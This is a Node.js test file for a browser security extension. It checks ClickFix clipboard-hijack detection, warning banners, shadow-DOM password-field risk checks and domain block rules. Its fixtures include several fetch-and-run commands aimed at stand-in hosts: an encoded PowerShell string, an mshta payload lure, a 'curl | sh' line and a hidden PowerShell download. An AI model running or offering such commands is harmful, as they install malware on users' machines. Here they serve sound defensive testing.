import test from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { analyzeClipboardPayload } from "../lib/clickfix.js";
import {
  DYNAMIC_RESOURCE_TYPES,
  DYNAMIC_RULE_ID_MAX,
  DYNAMIC_RULE_ID_START,
  buildDynamicBlockRules,
  buildDynamicDnrUpdatePlan,
  normalizeDynamicBlockDomains,
} from "../lib/dnr.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const EXT_DIR = path.resolve(__dirname, "..");
const CONTENT_JS_SRC = fs.readFileSync(path.join(EXT_DIR, "content.js"), "utf8");
const CONTENT_MAIN_JS_SRC = fs.readFileSync(path.join(EXT_DIR, "content_main.js"), "utf8");

function createEventTargetMixin() {
  const listeners = new Map();
  return {
    addEventListener(type, fn, capture = false) {
      if (!listeners.has(type)) {
        listeners.set(type, []);
      }
      listeners.get(type).push({ fn, capture: Boolean(capture) });
    },
    dispatchEvent(event) {
      const list = (listeners.get(event.type) || []).slice();
      const captureList = list.filter((l) => l.capture);
      const bubbleList = list.filter((l) => !l.capture);
      for (const entry of [...captureList, ...bubbleList]) {
        entry.fn(event);
      }
      return true;
    },
    async dispatchEventAsync(event) {
      const list = (listeners.get(event.type) || []).slice();
      const captureList = list.filter((l) => l.capture);
      const bubbleList = list.filter((l) => !l.capture);
      for (const entry of [...captureList, ...bubbleList]) {
        await entry.fn(event);
      }
      return true;
    },
  };
}

function createDomSandbox({
  url = "https://login.evil.localedr.invalid/signin",
  hostname = "login.evil.localedr.invalid",
  onRuntimeMessage,
  clipboardWriteTextImpl,
  nativeClipboardWriteImpl,
  nativeExecCommandImpl,
} = {}) {
  const allElements = [];

  class MockCustomEvent {
    constructor(type, init = {}) {
      this.type = type;
      this.detail = init.detail;
    }
  }

  class MockElement {
    constructor(tagName) {
      this.tagName = String(tagName || "div").toUpperCase();
      this.id = "";
      this.className = "";
      this.type = "";
      this.value = "";
      this.textContent = "";
      this.hidden = false;
      this.style = {};
      this.children = [];
      this.parentNode = null;
      this.attributes = new Map();
      this._events = createEventTargetMixin();
      this._closedShadow = null;
      allElements.push(this);
    }

    setAttribute(name, value) {
      this.attributes.set(String(name), String(value));
    }

    getAttribute(name) {
      return this.attributes.has(String(name)) ? this.attributes.get(String(name)) : null;
    }

    removeAttribute(name) {
      this.attributes.delete(String(name));
    }

    appendChild(child) {
      child.parentNode = this;
      this.children.push(child);
      return child;
    }

    remove() {
      if (this.parentNode && Array.isArray(this.parentNode.children)) {
        this.parentNode.children = this.parentNode.children.filter((c) => c !== this);
        this.parentNode = null;
      }
    }

    attachShadow() {
      const root = new MockElement("#shadow-root");
      this._closedShadow = root;
      return root;
    }

    addEventListener(type, fn, capture = false) {
      this._events.addEventListener(type, fn, capture);
    }

    async click() {
      await this._events.dispatchEventAsync({ type: "click", target: this });
    }

    getBoundingClientRect() {
      return { left: 10, right: 210, top: 40, bottom: 72, width: 200, height: 32 };
    }

    blur() {
      this.blurred = true;
    }
  }

  class MockDocument {}
  const docTarget = createEventTargetMixin();
  MockDocument.prototype.dispatchEvent = function dispatchEvent(event) {
    return docTarget.dispatchEvent(event);
  };
  MockDocument.prototype.execCommand = function execCommand(cmd) {
    if (typeof nativeExecCommandImpl === "function") {
      return nativeExecCommandImpl(cmd);
    }
    return false;
  };

  const doc = Object.create(MockDocument.prototype);
  doc.documentElement = new MockElement("html");
  doc.body = new MockElement("body");
  doc.activeElement = null;
  doc.createElement = (tag) => new MockElement(tag);
  doc.getElementById = (id) =>
    allElements.find((el) => el.parentNode !== null && el.id === id) || null;
  doc.addEventListener = (type, fn, capture) => docTarget.addEventListener(type, fn, capture);
  doc.dispatchEventAsync = (event) => docTarget.dispatchEventAsync(event);

  const winTarget = createEventTargetMixin();
  const winLocation = { href: url, hostname };

  class MockClipboard {}
  MockClipboard.prototype.writeText = async function writeText(text) {
    if (typeof clipboardWriteTextImpl === "function") {
      return await clipboardWriteTextImpl(text);
    }
    return undefined;
  };
  MockClipboard.prototype.write = async function write(items) {
    if (typeof nativeClipboardWriteImpl === "function") {
      return await nativeClipboardWriteImpl(items);
    }
    return undefined;
  };

  class MockDataTransfer {
    constructor() {
      this.data = new Map();
    }
  }
  MockDataTransfer.prototype.setData = function setData(format, data) {
    this.data.set(String(format), String(data));
  };

  const navigatorObj = {
    clipboard: Object.create(MockClipboard.prototype),
  };

  const mainWindow = {
    location: winLocation,
    innerWidth: 1280,
    innerHeight: 800,
    getSelection: () => ({ toString: () => "" }),
    addEventListener: (type, fn, capture) => winTarget.addEventListener(type, fn, capture),
    dispatchEvent: (event) => winTarget.dispatchEvent(event),
    CustomEvent: MockCustomEvent,
    Clipboard: MockClipboard,
    DataTransfer: MockDataTransfer,
    Document: MockDocument,
    Element: MockElement,
    HTMLElement: MockElement,
    document: doc,
    navigator: navigatorObj,
    WeakSet,
    Array,
    JSON,
    String,
    Object,
    Symbol,
    Uint8Array,
    URL,
    Date,
    Math,
    setTimeout,
    clearTimeout,
    queueMicrotask,
    requestAnimationFrame: (cb) => cb(),
  };
  mainWindow.window = mainWindow;

  const isoWindow = {
    ...mainWindow,
    chrome: {
      runtime: {
        async sendMessage(msg) {
          if (typeof onRuntimeMessage === "function") {
            return await onRuntimeMessage(msg);
          }
          return { ok: true };
        },
      },
    },
    crypto: {
      getRandomValues(arr) {
        return crypto.webcrypto.getRandomValues(arr);
      },
    },
  };
  isoWindow.window = isoWindow;

  const isoCtx = vm.createContext(isoWindow);
  const mainCtx = vm.createContext(mainWindow);

  vm.runInContext(CONTENT_JS_SRC, isoCtx);
  const publishedChannel = doc.documentElement.getAttribute("data-ledr-obs-ch");
  vm.runInContext(CONTENT_MAIN_JS_SRC, mainCtx);

  function findBannerButton(hostEl, labelText) {
    const shadow = hostEl?._closedShadow;
    if (!shadow) return null;
    const queue = [...shadow.children];
    while (queue.length > 0) {
      const node = queue.shift();
      if (node.tagName === "BUTTON" && node.textContent === labelText) {
        return node;
      }
      if (Array.isArray(node.children)) {
        queue.push(...node.children);
      }
    }
    return null;
  }

  function findByClass(hostEl, cls) {
    const shadow = hostEl?._closedShadow;
    if (!shadow) return null;
    const queue = [...shadow.children];
    while (queue.length > 0) {
      const node = queue.shift();
      if (String(node.className || "").split(/\s+/).includes(cls)) {
        return node;
      }
      if (Array.isArray(node.children)) {
        queue.push(...node.children);
      }
    }
    return null;
  }

  return {
    doc,
    mainWindow,
    navigatorObj,
    publishedChannel,
    MockElement,
    MockCustomEvent,
    MockDataTransfer,
    findBannerButton,
    findByClass,
  };
}

test("EXT-14: SEC_0002 random handshake, BUG_0002 copy persistence, and BUG_0011 generator materialization", async () => {
  const runtimeMessages = [];
  let nativeWriteReceived = null;

  const env = createDomSandbox({
    nativeClipboardWriteImpl: async (items) => {
      nativeWriteReceived = Array.from(items);
    },
    onRuntimeMessage: async (msg) => {
      runtimeMessages.push(msg);
      if (msg.type === "ANALYZE_CLIPBOARD") {
        return {
          ok: true,
          verdict: analyzeClipboardPayload({
            copiedText: msg.copiedText,
            selectionText: msg.selectionText,
            trigger: msg.trigger,
          }),
        };
      }
      return { ok: true };
    },
  });

  // 1. Handshake channel is random 128-bit token and immediately stripped after content_main initializes (SEC_0002)
  assert.match(env.publishedChannel, /^__ledr_obs_[0-9a-f]{32}$/);
  assert.equal(env.doc.documentElement.getAttribute("data-ledr-obs-ch"), null);

  // 2. Spoofed fixed __ledr_clipboard_observe__ event from page script must be ignored (SEC_0002)
  await env.doc.dispatchEventAsync(
    new env.MockCustomEvent("__ledr_clipboard_observe__", {
      detail: JSON.stringify({
        trigger: "writeText",
        copiedText: "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        selectionText: "",
      }),
    })
  );
  assert.equal(runtimeMessages.length, 0);

  // 3. DataTransfer.setData works even after a microtask tick inside a copy handler (BUG_0002)
  const dt = new env.MockDataTransfer();
  env.mainWindow.dispatchEvent({ type: "copy", clipboardData: dt });
  await Promise.resolve();
  dt.setData(
    "text/plain",
    "mshta https://cdn.evil.localedr.invalid/payload.hta # verify I am human"
  );
  await new Promise((r) => setTimeout(r, 15));
  assert.ok(
    runtimeMessages.some((m) => m.type === "ANALYZE_CLIPBOARD" && m.trigger === "copy")
  );

  // 4. Clipboard.write(generator()) forwards all items intact to native API and observes text (BUG_0011)
  const fakeItem = {
    types: ["text/plain"],
    async getType(mime) {
      assert.equal(mime, "text/plain");
      return {
        async text() {
          return "cmd /c curl -fsSL https://evil.localedr.invalid/s | sh";
        },
      };
    },
  };
  function* oneShotItems() {
    yield fakeItem;
  }
  await env.navigatorObj.clipboard.write(oneShotItems());
  assert.equal(nativeWriteReceived.length, 1);
  assert.equal(nativeWriteReceived[0], fakeItem);
  await new Promise((r) => setTimeout(r, 15));
  assert.ok(
    runtimeMessages.some((m) => m.type === "ANALYZE_CLIPBOARD" && m.trigger === "write")
  );
});

test("EXT-15: non-blocking banner, Clear Clipboard failure state, fresh focusin check, and Shadow DOM input", async () => {
  let clipboardFail = true;
  let reportPendingResolve = null;
  let riskCheckCount = 0;
  let riskFlip = false;
  const runtimeMessages = [];

  const env = createDomSandbox({
    clipboardWriteTextImpl: async (text) => {
      if (clipboardFail && text === "") {
        throw new Error("Document is not focused or HTTP context");
      }
    },
    onRuntimeMessage: async (msg) => {
      runtimeMessages.push(msg);
      if (msg.type === "ANALYZE_CLIPBOARD") {
        return {
          ok: true,
          verdict: analyzeClipboardPayload({
            copiedText: msg.copiedText,
            selectionText: msg.selectionText,
            trigger: msg.trigger,
          }),
        };
      }
      if (msg.type === "REPORT_BROWSER_EVENT") {
        return await new Promise((resolve) => {
          reportPendingResolve = resolve;
        });
      }
      if (msg.type === "CHECK_DOMAIN_RISK") {
        riskCheckCount += 1;
        return {
          ok: true,
          risk: riskFlip
            ? {
                domain: "login.evil.localedr.invalid",
                risky: true,
                isHomograph: false,
                isNrd: true,
                matchedBrand: null,
                hasPunycode: false,
              }
            : {
                domain: "login.evil.localedr.invalid",
                risky: false,
                isHomograph: false,
                isNrd: false,
                matchedBrand: null,
                hasPunycode: false,
              },
        };
      }
      return { ok: true };
    },
  });

  // 1. Trigger ClickFix banner while REPORT_BROWSER_EVENT stays unresolved (ANALYSIS_0003)
  await env.navigatorObj.clipboard.writeText(
    "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command iwr https://bad.localedr.invalid"
  );
  await new Promise((r) => setTimeout(r, 15));
  const clickfixHost = env.doc.getElementById("ledr-clickfix-warning-host");
  assert.ok(clickfixHost, "banner must mount before REPORT_BROWSER_EVENT resolves (ANALYSIS_0003)");
  if (reportPendingResolve) {
    reportPendingResolve({ ok: true });
  }

  // 2. Clear Clipboard failure keeps banner mounted and shows .status-error (BUG_0009)
  const clearBtn = env.findBannerButton(clickfixHost, "Clear Clipboard");
  const statusErr = env.findByClass(clickfixHost, "status-error");
  assert.ok(clearBtn && statusErr);
  await clearBtn.click();
  assert.ok(
    env.doc.getElementById("ledr-clickfix-warning-host"),
    "banner must stay visible when clipboard clear fails"
  );
  assert.equal(statusErr.hidden, false);
  assert.ok(statusErr.textContent.length > 0);

  // When retry succeeds, banner closes cleanly
  clipboardFail = false;
  await clearBtn.click();
  assert.equal(env.doc.getElementById("ledr-clickfix-warning-host"), null);

  // 3. Shadow DOM password input detection (BUG_0010) + no stale indefinite cache on focusin (BUG_0008)
  const shadowHost = new env.MockElement("my-login-box");
  const shadowPwInput = new env.MockElement("input");
  shadowPwInput.type = "password";

  await env.doc.dispatchEventAsync({
    type: "focusin",
    target: shadowHost,
    composedPath: () => [shadowPwInput, shadowHost, env.doc.body, env.doc.documentElement, env.doc],
  });
  assert.equal(riskCheckCount, 1);
  assert.equal(env.doc.getElementById("ledr-domain-warning-host"), null);

  // Flip risk verdict in mock SW and re-focus: must re-query CHECK_DOMAIN_RISK instead of serving stale cache
  riskFlip = true;
  await env.doc.dispatchEventAsync({
    type: "focusin",
    target: shadowHost,
    composedPath: () => [shadowPwInput, shadowHost, env.doc.body, env.doc.documentElement, env.doc],
  });
  assert.equal(riskCheckCount, 2);
  assert.ok(
    env.doc.getElementById("ledr-domain-warning-host"),
    "NRD warning banner must appear via Shadow DOM composedPath on second focusin"
  );
});

test("EXT-16: lib/dnr.js normalizes hostnames, caps rules, and preserves out-of-range dynamic IDs", () => {
  const normalized = normalizeDynamicBlockDomains([
    "  .Bad.Example.com. ",
    "bad.example.com",
    "localhost",
    "not a domain!",
    "sub.evil-site.example",
  ]);
  assert.deepEqual(normalized, ["bad.example.com", "sub.evil-site.example"]);

  const rules = buildDynamicBlockRules(["evil.localedr.invalid"]);
  assert.equal(rules.length, 1);
  assert.equal(rules[0].id, DYNAMIC_RULE_ID_START);
  assert.equal(rules[0].action.type, "block");
  assert.equal(rules[0].condition.urlFilter, "||evil.localedr.invalid^");
  assert.deepEqual(rules[0].condition.resourceTypes, DYNAMIC_RESOURCE_TYPES);

  const plan = buildDynamicDnrUpdatePlan(
    [
      { id: 500 }, // out-of-range rule must not be scheduled for removal
      { id: DYNAMIC_RULE_ID_START },
      { id: DYNAMIC_RULE_ID_MAX },
      { id: DYNAMIC_RULE_ID_MAX + 1 },
    ],
    ["a.localedr.invalid", "b.localedr.invalid", "a.localedr.invalid"]
  );
  assert.deepEqual(plan.removeRuleIds, [DYNAMIC_RULE_ID_START, DYNAMIC_RULE_ID_MAX]);
  assert.equal(plan.addRules.length, 2);
  assert.equal(plan.addRules[0].id, DYNAMIC_RULE_ID_START);
  assert.equal(plan.addRules[1].id, DYNAMIC_RULE_ID_START + 1);
});

test("EXT-18: content.js records download click hints for normal and Shadow DOM anchors while excluding javascript: and # hrefs", async () => {
  const hintMessages = [];
  const env = createDomSandbox({
    url: "https://portal.localedr.invalid/releases/index.html",
    hostname: "portal.localedr.invalid",
    onRuntimeMessage: async (msg) => {
      if (msg.type === "RECORD_DOWNLOAD_CLICK_HINT") {
        hintMessages.push({
          type: msg.type,
          targetUrl: msg.targetUrl,
          pageUrl: msg.pageUrl,
        });
      }
      return { ok: true };
    },
  });

  // 1. Normal DOM <a href="https://..."> click on nested <span> child
  const normalAnchor = new env.MockElement("a");
  normalAnchor.setAttribute("href", "https://cdn.localedr.invalid/downloads/setup.exe#latest");
  const childSpan = new env.MockElement("span");
  normalAnchor.appendChild(childSpan);

  await env.doc.dispatchEventAsync({
    type: "click",
    target: childSpan,
    composedPath: () => [childSpan, normalAnchor, env.doc.body, env.doc.documentElement, env.doc],
  });

  // 2. Normal DOM relative <a href="/files/tool.msi"> resolved against window.location.href (parentNode walk fallback)
  const relAnchor = new env.MockElement("a");
  relAnchor.setAttribute("href", "/files/tool.msi");
  const relChild = new env.MockElement("span");
  relAnchor.appendChild(relChild);

  await env.doc.dispatchEventAsync({
    type: "click",
    target: relChild,
  });

  // 3. Shadow DOM <a href="https://..."> click discovered through composedPath()
  const shadowHost = new env.MockElement("download-card");
  const shadowAnchor = new env.MockElement("a");
  shadowAnchor.setAttribute("href", "https://mirror.localedr.invalid/shadow-installer.zip");

  await env.doc.dispatchEventAsync({
    type: "click",
    target: shadowHost,
    composedPath: () => [shadowAnchor, shadowHost, env.doc.body, env.doc.documentElement, env.doc],
  });

  // 4. Excluded links: javascript:, #fragment, #, mailto:, and anchor without href must NOT emit hints
  const excludedHrefs = [
    "javascript:void(0)",
    "JAVASCRIPT:alert(1)",
    "#section-2",
    "#",
    "mailto:help@localedr.invalid",
    "",
  ];
  for (const href of excludedHrefs) {
    const a = new env.MockElement("a");
    if (href !== "") {
      a.setAttribute("href", href);
    }
    await env.doc.dispatchEventAsync({
      type: "click",
      target: a,
      composedPath: () => [a, env.doc.body, env.doc.documentElement, env.doc],
    });
  }

  assert.deepEqual(hintMessages, [
    {
      type: "RECORD_DOWNLOAD_CLICK_HINT",
      targetUrl: "https://cdn.localedr.invalid/downloads/setup.exe",
      pageUrl: "https://portal.localedr.invalid/releases/index.html",
    },
    {
      type: "RECORD_DOWNLOAD_CLICK_HINT",
      targetUrl: "https://portal.localedr.invalid/files/tool.msi",
      pageUrl: "https://portal.localedr.invalid/releases/index.html",
    },
    {
      type: "RECORD_DOWNLOAD_CLICK_HINT",
      targetUrl: "https://mirror.localedr.invalid/shadow-installer.zip",
      pageUrl: "https://portal.localedr.invalid/releases/index.html",
    },
  ]);
});
